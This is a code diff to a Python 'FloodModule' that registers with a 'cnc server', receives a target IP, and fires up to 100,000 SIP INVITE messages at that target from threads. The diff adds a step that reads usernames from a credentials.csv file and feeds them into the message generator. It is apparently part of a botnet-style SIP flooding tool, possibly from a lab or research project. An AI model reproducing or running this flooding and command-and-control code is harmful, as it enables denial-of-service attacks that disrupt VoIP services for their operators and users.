@@ -1,3 +1,4 @@
+import csv
 import socket
 import threading
 
@@ -12,18 +13,29 @@ import random
 class FloodModule:
     s = None
     gp = None
+    mc = None
     data = []
     running = None
     message_array = []
     packet_array = []
+    credentials = []
+    users = []
 
     def __init__(self):
         self.running = False
         self.s = sendInvite.SendInvite
-        mc = messageCreator.MessageCreator()
+        self.read_users()
+        self.mc = messageCreator.MessageCreator(self.users)
         self.gp = generatePacket.GeneratePacket()
-        for i in range(0,1000):
-            self.message_array.append(mc.make_message())
+
+
+    def read_users(self):
+        with open('credentials.csv') as f:
+            lines = f.readlines()
+        for i in range(len(lines)):
+            line = lines[i]
+            credentials = line.split(';')
+            self.users.append(credentials[0])
 
     def fire_thread(self, payload, packet_array):
         """Call sendInvite to fire payload to the SIP server"""
@@ -43,6 +55,8 @@ class FloodModule:
             self.data = sock.recvfrom(buffersize)
         print("Registered at cnc server")
         print("Starting packet initialisation. This will take a while...")
+        for i in range(0,1000):
+            self.message_array.append(self.mc.make_message())
         target_ip = self.data[0].decode()
         for i in range(0, 100000):
             message = self.message_array[random.randint(0, 999)]
